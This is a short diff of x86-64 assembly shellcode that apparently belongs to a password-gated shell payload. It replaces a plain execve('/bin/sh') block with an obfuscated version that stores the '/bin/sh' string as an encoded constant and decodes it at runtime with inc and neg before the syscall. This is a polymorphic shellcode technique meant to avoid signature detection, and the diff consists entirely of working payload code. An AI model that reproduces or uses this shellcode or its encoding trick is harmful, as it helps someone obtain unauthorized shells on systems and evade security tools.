@@ -93,17 +93,15 @@ password_check:
 	lea rdi, [rel rsi]
 	scasd           ; comparing the user input and stored password in the stack
 	
-	
-    
-execve:                                      ; Execve format  , execve("/bin/sh", 0 , 0)
-     xor rsi , rsi
-     mul rsi                                 ; zeroed rax , rdx register 
-     push ax                                 ; terminate string with null
-     mov rbx , 0x68732f2f6e69622f            ; "/bin//sh"  in reverse order 
-     push rbx
-     push rsp
-     pop rdi                                 ; set RDI
-     push byte 0x3b                          ; execve syscall number (59)
-     pop rax
-     syscall
-
+execve:                                      
+    xor esi, esi
+    mov rdi, 0xff978cd091969dd0
+    inc rdi
+    neg rdi
+    mul esi
+    add al, 0x3b
+    push rdi
+    push rsp
+    pop r10
+    mov rdi, r10
+    syscall
